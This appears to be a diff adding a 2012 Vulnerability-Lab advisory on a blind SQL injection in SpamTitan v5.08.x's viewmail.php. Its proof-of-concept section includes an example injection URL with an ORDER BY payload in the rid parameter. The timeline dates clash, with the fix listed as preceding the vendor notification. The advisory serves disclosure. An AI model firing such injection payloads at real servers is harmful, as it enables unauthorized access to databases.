@@ -1,0 +1,144 @@
+Title:
+======
+SpamTitan Application v5.08x - SQL Injection Vulnerability
+
+
+Date:
+=====
+2012-01-23
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=197
+
+
+VL-ID:
+=====
+197
+
+
+Introduction:
+=============
+SpamTitan Anti Spam is a complete software solution to email security offering protection from Spam, Viruses, Trojans, Phishing 
+and unwanted content. Feature Set 
+
+    * Two Anti Virus engines including ClamAV and Kaspersky Labs
+    * Multi layered Anti Spam analyses resulting in 98% plus Spam detection
+    * Less than 0.03% False Positive Rate
+    * Content Filtering
+    * Inward and outward email scanning
+    * Email Disclaimer capability
+    * Simple download and installation process
+    * Plug and Play Solution
+    * End user Spam management using email quarantine reports
+    * Web based administrative GUI
+    * Multiple automated reports
+    * Automated updating including anti virus, anti spam, version releases and system backup
+    * LDAP, Dynamic and aliases file recipient verification
+    * Per domain administrators
+    * Per domain reports
+    * API
+    * Multi node Cluster
+
+SpamTitan is available in two flavours, SpamTitan ISO and SpamTitan for VMware?, both of which can be downloaded and installed for free.
+
+(Copy of the Vendor Homepage: http://www.spamtitan.com/products)
+
+
+Abstract:
+=========
+Vulnerability Lab Team discovered a remote SQL Injection vulnerability on the  SpamTitan Appliance(Application) v5.08.x
+
+
+Report-Timeline:
+================
+2011-09-17:	Vendor Notification
+2011-11-20:	Vendor Response/Feedback
+2011-01-14:	Vendor Fix/Patch
+2011-01-23:	Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Affected Products:
+==================
+Copperfasten Technologies
+Product: SpamTitan Appliance Application v5.0x
+
+
+Exploitation-Technique:
+=======================
+Remote
+
+
+Severity:
+=========
+Critical
+
+
+Details:
+========
+A remote sql injection vulnerability is detected on the new SpamTitan Application v5.08.x
+The vulnerability allows an remote attacker to inject & execute own sql statements blind.
+The attack method is Order by Injection.
+
+
+--- Error Logs ---
+MDB2 Error: unknown error
+
+
+Vulnerable Module(s):	
+					      [+] Session QID+RID
+
+Picture(s):
+					      ../sql1.png
+
+
+Proof of Concept:
+=================
+The vulnerabilitys can be exploited by remote attackers. For demonstration or reproduce ...
+
+Path:					../
+File:					viewmail.php
+Param(s):				?activepage=details&qid=w3jYVc7V3LFF&rid=
+
+Section(SQL):
+http://[Server]:[Port]/[File]+[Param]+[Session]&[QID]=87' order by 15--
+
+
+Reference(s):
+http://xxx.com:8080/viewmail.php?activepage=details&qid=w3jYVc7V3LFF&rid=87%27%20order%20by%2015--
+
+
+Risk:
+=====
+The security risk of the sql injection vulnerability are estimated as critical.
+
+
+Credits:
+========
+Vulnerability Research Laboratory - Benjamin Kunz Mejri & Pim J.F. Campers
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+    						Copyright ? 2012|Vulnerability-Lab
+
+-- 
+Website: www.vulnerability-lab.com ; vuln-lab.com or vuln-db.com
+Contact: admin@vulnerability-lab.com or support@vulnerability-lab.com
+
+
